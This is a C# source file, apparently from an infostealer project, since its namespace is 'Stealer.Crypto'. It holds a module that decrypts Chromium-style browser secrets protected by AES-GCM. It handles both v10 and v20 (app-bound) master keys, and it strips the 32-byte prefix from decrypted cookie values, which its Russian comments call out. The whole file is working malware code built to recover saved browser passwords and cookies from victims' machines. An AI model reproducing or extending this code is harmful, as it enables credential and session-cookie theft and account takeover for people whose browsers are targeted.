using System;
using System.Text;

namespace Stealer.Crypto
{
    public static class AesGcmBrowser
    {
        public static byte[] Decrypt(byte[] encryptedData, byte[] masterKeyV10, byte[] masterKeyV20, bool checkPrefix = false)
        {
            if (encryptedData == null || encryptedData.Length < 31)
                return null;

            try
            {
                // Проверяем префикс v10/v20
                string prefix = Encoding.ASCII.GetString(encryptedData, 0, 3);
                
                // Извлекаем nonce (12 байт после префикса)
                byte[] nonce = new byte[12];
                Buffer.BlockCopy(encryptedData, 3, nonce, 0, 12);

                // Ciphertext начинается с позиции 15
                int ciphertextLength = encryptedData.Length - 15 - 16;
                if (ciphertextLength < 0)
                    return null;

                byte[] ciphertext = new byte[ciphertextLength];
                if (ciphertextLength > 0)
                    Buffer.BlockCopy(encryptedData, 15, ciphertext, 0, ciphertextLength);

                // Tag - последние 16 байт
                byte[] tag = new byte[16];
                Buffer.BlockCopy(encryptedData, encryptedData.Length - 16, tag, 0, 16);

                // Выбираем ключ
                byte[] masterKey = prefix == "v20" ? masterKeyV20 : 
                                   prefix == "v10" ? masterKeyV10 : null;

                // Если префикс не определился или неизвестен — пробуем оба ключа по очереди
                if (masterKey == null)
                {
                    byte[] dec = null;
                    if (masterKeyV10 != null)
                        dec = AesGcm256.Decrypt(masterKeyV10, nonce, null, ciphertext, tag);
                    if (dec == null && masterKeyV20 != null)
                        dec = AesGcm256.Decrypt(masterKeyV20, nonce, null, ciphertext, tag);
                    
                    if (dec == null)
                        return null;

                    if (checkPrefix && dec.Length > 32 && HasPrefix(dec))
                    {
                        byte[] result = new byte[dec.Length - 32];
                        Array.Copy(dec, 32, result, 0, result.Length);
                        return result;
                    }
                    return dec;
                }

                // Расшифровываем
                byte[] decrypted = AesGcm256.Decrypt(masterKey, nonce, null, ciphertext, tag);
                
                if (decrypted == null)
                    return null;

                // Если checkPrefix=true (для кук) - проверяем и удаляем префикс
                if (checkPrefix && decrypted.Length > 32 && HasPrefix(decrypted))
                {
                    // Проверяем есть ли printable символы в первых 32 байтах
                    int printableCount = 0;
                    for (int i = 0; i < 32; i++)
                    {
                        if (decrypted[i] >= 32 && decrypted[i] <= 126)
                            printableCount++;
                        if (printableCount > 2)
                            break;
                    }

                    // Если есть printable символы - удаляем первые 32 байта
                    if (printableCount > 2)
                    {
                        byte[] result = new byte[decrypted.Length - 32];
                        Array.Copy(decrypted, 32, result, 0, result.Length);
                        return result;
                    }
                }

                return decrypted;
            }
            catch
            {
                return null;
            }
        }

        private static bool HasPrefix(byte[] data)
        {
            if (data.Length < 32)
                return false;

            int printableCount = 0;
            for (int i = 0; i < 32; i++)
            {
                if (data[i] >= 32 && data[i] <= 126)
                    printableCount++;
            }

            return printableCount > 2;
        }
    }
}
